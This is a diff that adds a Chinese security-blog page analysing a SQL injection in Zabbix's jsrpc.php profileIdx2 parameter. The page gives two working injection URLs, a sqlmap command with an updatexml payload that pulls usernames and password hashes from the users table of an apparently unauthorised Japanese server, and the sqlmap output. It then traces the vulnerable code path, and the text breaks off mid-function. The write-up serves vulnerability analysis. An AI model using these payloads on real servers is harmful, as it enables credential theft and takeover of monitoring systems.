@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                zabbix SQL Inject Vul |
+                    
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">zabbix SQL Inject Vul</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">langu_xyz</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2017-02-18 21:00:00
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.4k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>13 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>zabbix是一个开源的企业级性能监控解决方案。近日，zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。</p>
+<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h2><p>无需登录注入这里有个前提，就是zabbix开启了guest权限。而在zabbix中，guest的默认密码为空。需要有这个条件的支持才可以进行无权限注入。</p>
+<h2 id="0x02-影响程度"><a href="#0x02-影响程度" class="headerlink" title="0x02 影响程度"></a>0x02 影响程度</h2><ul>
+<li>攻击成本：低</li>
+<li>危害程度：高</li>
+<li>是否登陆：不需要</li>
+<li>影响版本：2.2.x，3.0.0-3.0.3</li>
+</ul>
+<h2 id="0x03-漏洞测试"><a href="#0x03-漏洞测试" class="headerlink" title="0x03 漏洞测试"></a>0x03 漏洞测试</h2><p>在zabbix的地址后面添加：</p>
+<ul>
+<li>利用方式一</li>
+</ul>
+<p><code>/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;tim estamp=1471054088083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=hi story.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2’3297&amp;updateProfil e=true&amp;screenitemid=&amp;period=3600&amp;stime=20170813040734&amp;resourcetype= 17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp; mark_color=1</code></p>
+<p>如果出现下列代码则证明漏洞存在</p>
+<p><code>&lt;div class=&quot;flickerfreescreen&quot; data-timestamp=&quot;1471054088083&quot; id=&quot;flickerfreescreen_1&quot;&gt;&lt;table class=&quot;list-table&quot; id=&quot;t57ae81946b8cb&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th class=&quot;cell- width&quot;&gt;Timestamp&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr class=&quot;nothing-to-show&quot;&gt;&lt;td colspan=&quot;2&quot;&gt;No data found.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class=&quot;msg-bad&quot;&gt;&lt;div class=&quot;msg-details&quot;&gt;&lt;ul&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (39, 1, &#39;web.item.graph.period&#39;, &#39;3600&#39;, 2, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_str, type, idx2) VALUES (40, 1, &#39;web.item.graph.stime&#39;, &#39;20160813041028&#39;, 3, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (41, 1, &#39;web.item.graph.isnow&#39;, &#39;1&#39;, 2, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;span class=&quot;overlay-close-btn&quot; onclick=&quot;javascript: $(this).closest(&#39;.msg-bad&#39;).remove();&quot; title=&quot;Close&quot;&gt;&lt;/span&gt;&lt;/div&gt;</code></p>
+<ul>
+<li>利用方式二</li>
+</ul>
+<p><code>latest.php?output=ajax&amp;sid=&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=15385);select * from users where (1=1</code></p>
+<p>如果出现下列代码则证明漏洞存在</p>
+<p><code>SQL (0.000361):INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES(88, 1, &#39;web.latest.toggle&#39;, &#39;1&#39;, 2, 15385); select * from users where (1=1) latest.php:746 →require_once() → CProfile::flush() → CProfile::insertDB() → DBexecute() in/home/sasha/zabbix-svn/branches/2.2/frontends/php/include/profiles.inc.php:185</code></p>
+<h2 id="0x04-实战测试"><a href="#0x04-实战测试" class="headerlink" title="0x04 实战测试"></a>0x04 实战测试</h2><p>测试的一个Japan站</p>
+<p><code>sqlmap -u &quot;http://157.×××.×××.98/jsrpc.php?type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1(select(select+concat(0x7e,alias,0x7e,passwd,0x7e))+from+zabbix.users+LIMIT+0,1),1)+or+1=1)%23&amp;updateProfile=true&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&quot; --level=3 --risk=2 --columns -T &quot;users&quot; -D &quot;public&quot;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Database: public</span><br><span class="line">Table: users</span><br><span class="line">[16 columns]</span><br><span class="line">+----------------+---------+</span><br><span class="line">| Column         | Type    |</span><br><span class="line">+----------------+---------+</span><br><span class="line">| alias          | varchar |</span><br><span class="line">| attempt_clock  | int4    |</span><br><span class="line">| attempt_failed | int4    |</span><br><span class="line">| attempt_ip     | varchar |</span><br><span class="line">| autologin      | int4    |</span><br><span class="line">| autologout     | int4    |</span><br><span class="line">| lang           | varchar |</span><br><span class="line">| name           | varchar |</span><br><span class="line">| passwd         | bpchar  |</span><br><span class="line">| refresh        | int4    |</span><br><span class="line">| rows_per_page  | int4    |</span><br><span class="line">| surname        | varchar |</span><br><span class="line">| theme          | varchar |</span><br><span class="line">| type           | int4    |</span><br><span class="line">| url            | varchar |</span><br><span class="line">| userid         | int8    |</span><br><span class="line">+----------------+---------+</span><br></pre></td></tr></table></figure>
+
+<p>可获得最高权限</p>
+<h2 id="0x05-代码分析"><a href="#0x05-代码分析" class="headerlink" title="0x05 代码分析"></a>0x05 代码分析</h2><p>zabbix 2.2.14</p>
+<ul>
+<li>首先从poc中的<code>jsrpc.php</code>文件入手，</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">require_once dirname(__FILE__).&#x27;/include/config.inc.php&#x27;;</span><br><span class="line"></span><br><span class="line">$requestType = get_request(&#x27;type&#x27;, PAGE_TYPE_JSON);</span><br><span class="line">if ($requestType == PAGE_TYPE_JSON) &#123;</span><br><span class="line">    $http_request = new CHTTP_request();</span><br><span class="line">    $json = new CJSON();</span><br><span class="line">    $data = $json-&gt;decode($http_request-&gt;body(), true);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    $data = $_REQUEST;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从这里看到data是由REQUEST赋值的，接受 GET/POST/COOKIE任意一种输入，所以payload可以用get方式传输，在payload中由<code>method=screen.get</code>这一部分，在源码中可以看到如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">case &#x27;screen.get&#x27;:</span><br><span class="line">        $options = array(</span><br><span class="line">            &#x27;pageFile&#x27; =&gt; !empty($data[&#x27;pageFile&#x27;]) ? $data[&#x27;pageFile&#x27;] : null,</span><br><span class="line">            &#x27;mode&#x27; =&gt; !empty($data[&#x27;mode&#x27;]) ? $data[&#x27;mode&#x27;] : null,</span><br><span class="line">            &#x27;timestamp&#x27; =&gt; !empty($data[&#x27;timestamp&#x27;]) ? $data[&#x27;timestamp&#x27;] : time(),</span><br><span class="line">            &#x27;resourcetype&#x27; =&gt; !empty($data[&#x27;resourcetype&#x27;]) ? $data[&#x27;resourcetype&#x27;] : null,</span><br><span class="line">            &#x27;screenitemid&#x27; =&gt; !empty($data[&#x27;screenitemid&#x27;]) ? $data[&#x27;screenitemid&#x27;] : null,</span><br><span class="line">            &#x27;groupid&#x27; =&gt; !empty($data[&#x27;groupid&#x27;]) ? $data[&#x27;groupid&#x27;] : null,</span><br><span class="line">            &#x27;hostid&#x27; =&gt; !empty($data[&#x27;hostid&#x27;]) ? $data[&#x27;hostid&#x27;] : null,</span><br><span class="line">            &#x27;period&#x27; =&gt; !empty($data[&#x27;period&#x27;]) ? $data[&#x27;period&#x27;] : null,</span><br><span class="line">            &#x27;stime&#x27; =&gt; !empty($data[&#x27;stime&#x27;]) ? $data[&#x27;stime&#x27;] : null,</span><br><span class="line">            &#x27;profileIdx&#x27; =&gt; !empty($data[&#x27;profileIdx&#x27;]) ? $data[&#x27;profileIdx&#x27;] : null,</span><br><span class="line">            &#x27;profileIdx2&#x27; =&gt; !empty($data[&#x27;profileIdx2&#x27;]) ? $data[&#x27;profileIdx2&#x27;] : null,</span><br><span class="line">            &#x27;updateProfile&#x27; =&gt; isset($data[&#x27;updateProfile&#x27;]) ? $data[&#x27;updateProfile&#x27;] : null</span><br><span class="line">        );</span><br><span class="line">        if ($options[&#x27;resourcetype&#x27;] == SCREEN_RESOURCE_HISTORY) &#123;</span><br><span class="line">            $options[&#x27;itemids&#x27;] = !empty($data[&#x27;itemids&#x27;]) ? $data[&#x27;itemids&#x27;] : null;</span><br><span class="line">            $options[&#x27;action&#x27;] = !empty($data[&#x27;action&#x27;]) ? $data[&#x27;action&#x27;] : null;</span><br><span class="line">            $options[&#x27;filter&#x27;] = !empty($data[&#x27;filter&#x27;]) ? $data[&#x27;filter&#x27;] : null;</span><br><span class="line">            $options[&#x27;filter_task&#x27;] = !empty($data[&#x27;filter_task&#x27;]) ? $data[&#x27;filter_task&#x27;] : null;</span><br><span class="line">            $options[&#x27;mark_color&#x27;] = !empty($data[&#x27;mark_color&#x27;]) ? $data[&#x27;mark_color&#x27;] : null;</span><br><span class="line">        &#125;</span><br><span class="line">        elseif ($options[&#x27;resourcetype&#x27;] == SCREEN_RESOURCE_CHART) &#123;</span><br><span class="line">            $options[&#x27;graphid&#x27;] = !empty($data[&#x27;graphid&#x27;]) ? $data[&#x27;graphid&#x27;] : null;</span><br><span class="line">            $options[&#x27;profileIdx2&#x27;] = $options[&#x27;graphid&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $screenBase = CScreenBuilder::getScreen($options);</span><br><span class="line">        if (!empty($screenBase)) &#123;</span><br><span class="line">            $screen = $screenBase-&gt;get();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!empty($screen)) &#123;</span><br><span class="line">            if ($options[&#x27;mode&#x27;] == SCREEN_MODE_JS) &#123;</span><br><span class="line">                $result = $screen;</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                if (is_object($screen)) &#123;</span><br><span class="line">                    $result = $screen-&gt;toString();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            $result = &#x27;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">省略部分代码</span><br><span class="line"></span><br><span class="line">require_once dirname(__FILE__).&#x27;/include/page_footer.php&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其中$options[profileIdx2]赋值了$data[profileIdx2]，<br>之后调用这几句代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$screenBase = CScreenBuilder::getScreen($options);</span><br><span class="line">if (!empty($screenBase)) &#123;</span><br><span class="line">    $screen = $screenBase-&gt;get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一时没了思路，跟几句代码死磕，找到<code>zabbix-2.2.14/frontends/php/include/classes/screens/CScreenBuilder.php</code>，<del>在<code>public static function getScreen(array $options = array())</code>函数中没有找到可以造成漏洞的交互点，太菜了！！！</del> ,可以看到<code>profileIdx2</code>已经到达了下面代码中了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// calculate time</span><br><span class="line">        $this-&gt;profileIdx = !empty($options[&#x27;profileIdx&#x27;]) ? $options[&#x27;profileIdx&#x27;] : &#x27;&#x27;;</span><br><span class="line">        $this-&gt;profileIdx2 = !empty($options[&#x27;profileIdx2&#x27;]) ? $options[&#x27;profileIdx2&#x27;] : null;</span><br><span class="line">        $this-&gt;updateProfile = isset($options[&#x27;updateProfile&#x27;]) ? $options[&#x27;updateProfile&#x27;] : true;</span><br></pre></td></tr></table></figure>
+
+<p>一路上没有经过任何过滤，然后接着往下看可以看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;timeline = CScreenBase::calculateTime(array(</span><br><span class="line">            &#x27;profileIdx&#x27; =&gt; $this-&gt;profileIdx,</span><br><span class="line">            &#x27;profileIdx2&#x27; =&gt; $this-&gt;profileIdx2,</span><br><span class="line">            &#x27;updateProfile&#x27; =&gt; $this-&gt;updateProfile,</span><br><span class="line">            &#x27;period&#x27; =&gt; !empty($options[&#x27;period&#x27;]) ? $options[&#x27;period&#x27;] : null,</span><br><span class="line">            &#x27;stime&#x27; =&gt; !empty($options[&#x27;stime&#x27;]) ? $options[&#x27;stime&#x27;] : null</span><br><span class="line">        ));</span><br></pre></td></tr></table></figure>
+
+<p><code>profileIdx2</code>成为了<code>calculateTime</code>的参数，这时我们追踪一下<code>calculateTime</code>函数，在<code>zabbix-2.2.14/frontends/php/include/classes/screens/CScreenBase.php</code>中，代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public static function calculateTime(array $options = array()) &#123;</span><br><span class="line">    if (!array_key_exists(&#x27;updateProfile&#x27;, $options)) &#123;</span><br><span class="line">        $options[&#x27;updateProfile&#x27;] = true;</span><br><span class="line">    &#125;</span><br><span class="line">    if (empty($options[&#x27;profileIdx2&#x27;])) &#123;</span><br><span class="line">        $options[&#x27;profileIdx2&#x27;] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // show only latest data without update is set only period</span><br><span class="line">    if (!empty($options[&#x27;period&#x27;]) &amp;&amp; empty($options[&#x27;stime&#x27;])) &#123;</span><br><span class="line">        $options[&#x27;updateProfile&#x27;] = false;</span><br><span class="line">        $options[&#x27;profileIdx&#x27;] = &#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // period</span><br><span class="line">    if (empty($options[&#x27;period&#x27;])) &#123;</span><br><span class="line">        $options[&#x27;period&#x27;] = !empty($options[&#x27;profileIdx&#x27;])</span><br><span class="line">            ? CProfile::get($options[&#x27;profileIdx&#x27;].&#x27;.period&#x27;, ZBX_PERIOD_DEFAULT, $options[&#x27;profileIdx2&#x27;])</span><br><span class="line">            : ZBX_PERIOD_DEFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        if ($options[&#x27;period&#x27;] &lt; ZBX_MIN_PERIOD) &#123;</span><br><span class="line">            show_message(_n(&#x27;Minimum time period to display is %1$s hour.&#x27;,</span><br><span class="line">                    &#x27;Minimum time period to display is %1$s hours.&#x27;, (int) ZBX_MIN_PERIOD / SEC_PER_HOUR));</span><br><span class="line">            $options[&#x27;period&#x27;] = ZBX_MIN_PERIOD;</span><br><span class="line">        &#125;</span><br><span class="line">        elseif ($options[&#x27;period&#x27;] &gt; ZBX_MAX_PERIOD) &#123;</span><br><span class="line">            show_message(_n(&#x27;Maximum time period to display is %1$s day.&#x27;,</span><br><span class="line">                    &#x27;Maximum time period to display is %1$s days.&#x27;, (int) ZBX_MAX_PERIOD / SEC_PER_DAY));</span><br><span class="line">            $options[&#x27;period&#x27;] = ZBX_MAX_PERIOD;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($options[&#x27;updateProfile&#x27;] &amp;&amp; !empty($options[&#x27;profileIdx&#x27;])) &#123;</span><br><span class="line">        CProfile::update($options[&#x27;profileIdx&#x27;].&#x27;.period&#x27;, $options[&#x27;period&#x27;], PROFILE_TYPE_INT, $options[&#x27;profileIdx2&#x27;]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点来了，可以看到<code>CProfile::update($options[&#39;profileIdx&#39;].&#39;.period&#39;, $options[&#39;period&#39;], PROFILE_TYPE_INT, $options[&#39;profileIdx2&#39;]);</code>这句，这时接着追踪CProfile来到<code>page_footer.php</code>中找到<code>profiles.inc.php</code>，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static function update($idx, $value, $type, $idx2 = 0) &#123;</span><br><span class="line">        if (is_null(self::$profiles)) &#123;</span><br><span class="line">            self::init();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!self::checkValueType($value, $type)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $profile = array(</span><br><span class="line">            &#x27;idx&#x27; =&gt; $idx,</span><br><span class="line">            &#x27;value&#x27; =&gt; $value,</span><br><span class="line">            &#x27;type&#x27; =&gt; $type,</span><br><span class="line">            &#x27;idx2&#x27; =&gt; $idx2</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $current = CProfile::get($idx, null, $idx2);</span><br><span class="line">        if (is_null($current)) &#123;</span><br><span class="line">            if (!isset(self::$insert[$idx])) &#123;</span><br><span class="line">                self::$insert[$idx] = array();</span><br><span class="line">            &#125;</span><br><span class="line">            self::$insert[$idx][$idx2] = $profile;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>self::$insert[$idx][$idx2] = $profile;</code>，参数已经到了<code>insert</code>中，</p>
+<p><del>然后去请教表哥，表哥提示问题出现在<code>flush</code>中<br>根据表哥的提示，</del><br>在<code>page_footer.php</code>中发现CProfile类的flush方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// last page</span><br><span class="line">if (!defined(&#x27;ZBX_PAGE_NO_MENU&#x27;) &amp;&amp; $page[&#x27;file&#x27;] != &#x27;profile.php&#x27;) &#123;</span><br><span class="line">    CProfile::update(&#x27;web.paging.lastpage&#x27;, $page[&#x27;file&#x27;], PROFILE_TYPE_STR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CProfile::flush();</span><br><span class="line"></span><br><span class="line">// end transactions if they have not been closed already</span><br><span class="line">if (isset($DB) &amp;&amp; isset($DB[&#x27;TRANSACTIONS&#x27;]) &amp;&amp; $DB[&#x27;TRANSACTIONS&#x27;] != 0) &#123;</span><br><span class="line">    error(_(&#x27;Transaction has not been closed. Aborting...&#x27;));</span><br><span class="line">    DBend(false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>profiles.inc.php</code>中找到了flush函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public static function flush() &#123;</span><br><span class="line">        // if not initialised, no changes were made</span><br><span class="line">        if (is_null(self::$profiles)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (self::$userDetails[&#x27;userid&#x27;] &lt;= 0) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!empty(self::$insert) || !empty(self::$update)) &#123;</span><br><span class="line">            DBstart();</span><br><span class="line">            foreach (self::$insert as $idx =&gt; $profile) &#123;</span><br><span class="line">                foreach ($profile as $idx2 =&gt; $data) &#123;</span><br><span class="line">                    self::insertDB($idx, $data[&#x27;value&#x27;], $data[&#x27;type&#x27;], $idx2);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ksort(self::$update);</span><br><span class="line">            foreach (self::$update as $idx =&gt; $profile) &#123;</span><br><span class="line">                ksort($profile);</span><br><span class="line">                foreach ($profile as $idx2 =&gt; $data) &#123;</span><br><span class="line">                    self::updateDB($idx, $data[&#x27;value&#x27;], $data[&#x27;type&#x27;], $idx2);</span><br><span class="line">                &#125;</span><br><span class="line">            